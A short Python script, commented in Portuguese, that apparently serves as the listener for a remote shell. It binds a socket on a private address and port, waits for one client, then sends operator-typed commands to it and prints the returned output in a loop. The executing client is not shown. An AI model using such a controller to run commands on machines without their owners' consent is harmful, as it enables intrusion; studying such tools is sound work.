import socket

HOST = '10.0.0.130'
PORT = 4231

server = socket.socket()

server.bind((HOST, PORT))
print("Servidor iniciado")
print("Aguardando cliente se conectar")

server.listen(1)

client, client_end = server.accept()
print(f"{client_end} cliente conectado no servidor")

while True:
        command = input('Insira os comandos: ')
        command = command.encode()
        client.send(command)
        print('Comando enviado')
        saida = client.recv(1024)
        saida = saida.decode(encoding='iso8859-1')
        print(f"Saida: {saida}")
